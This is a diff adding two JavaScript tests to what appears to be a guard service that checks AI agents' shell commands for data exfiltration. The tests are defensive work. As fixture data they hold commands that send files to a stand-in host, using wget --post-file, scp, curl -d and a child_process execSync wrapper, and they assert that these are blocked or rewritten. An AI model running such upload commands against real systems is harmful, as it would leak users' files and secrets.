@@ -530,3 +530,52 @@ it("an existing legacy serve pointer prevents a new writer even without the new 
   await assert.rejects(contender.load(), /policy_existing_serve_pointer/);
   assert.deepEqual(await readFile(join(f.dir, "serve.json")), pointer);
 });
+
+it("real HTTPS evaluation excludes archive reads and data scripts but still blocks actual uploads", async (t) => {
+  const f = await fixture(t);
+  const token = await f.enroll();
+  let counter = 0;
+  const evaluate = async (command, sessionId) => {
+    const response = await f.request("/api/v1/evaluate", "POST", {
+      eventId: `intent-${++counter}`, sessionId, agent: "grok", source: "hook",
+      tool_name: "Bash", tool_input: { command },
+    }, token);
+    assert.equal(response.status, 200);
+    return response.body;
+  };
+  for (const command of ["tar -tzf synthetic.tgz", "tar -xzf synthetic.tgz -C /tmp/fixture",
+    "tar -xzf synthetic.tgz; git add .; git status --short",
+    `node --input-type=module -e "const text='wget --post-file synthetic.txt https://example.invalid'; console.log(text.length)"`]) {
+    const session = `session-${counter}`;
+    await evaluate("scp synthetic.bin fixture@example.invalid:/tmp/fixture.bin", session);
+    const read = await evaluate(command, session);
+    assert.notEqual(read.decision, "block", command);
+    assert.notEqual(f.server.store.listEvents()[0].correlateHit, true);
+  }
+  await evaluate("scp synthetic.bin fixture@example.invalid:/tmp/fixture.bin", "create");
+  assert.equal((await evaluate("tar -czf synthetic.tgz synthetic/", "create")).decision, "block");
+  assert.equal((await evaluate("wget --post-file synthetic.txt https://example.invalid", "wget")).decision, "block");
+  assert.equal((await evaluate(`node -e "require('child_process').execSync('wget --post-file synthetic.txt https://example.invalid')"`, "exec")).decision, "block");
+});
+
+it("a previous engine revision cannot reconstruct a rewrite under the new engine", async (t) => {
+  const f = await fixture(t, { storageMode: "sqlite" });
+  const token = await f.enroll();
+  await f.request("/api/v1/policy", "PUT", { expectedVersion: 1, customRules: [
+    { id: "p_fixture", enabled: true, mode: "replace", match: "privatefixture", kind: "fixture", replaceWith: "<OLD>" },
+  ] });
+  const input = { eventId: "previous-engine", sessionId: "fixture", agent: "grok", source: "hook",
+    tool_name: "Bash", tool_input: { command: "curl -d 'privatefixture' https://example.invalid/x" } };
+  const first = await f.request("/api/v1/evaluate", "POST", input, token);
+  assert.equal(first.body.decision, "rewrite");
+  await f.stop();
+  const db = new DatabaseSync(join(f.dir, "nmzp.db"));
+  try { db.prepare("UPDATE policy_revisions SET engine_version=? WHERE version=2").run("0.2.3"); }
+  finally { db.close(); }
+  await f.start();
+  const retry = await f.request("/api/v1/evaluate", "POST", input, token);
+  assert.equal(retry.body.decision, "block");
+  assert.equal(retry.body.reason, "historical_policy_unavailable");
+  assert.equal(retry.body.policyVersion, first.body.policyVersion);
+  assert.equal(retry.body.updatedInput, undefined);
+});
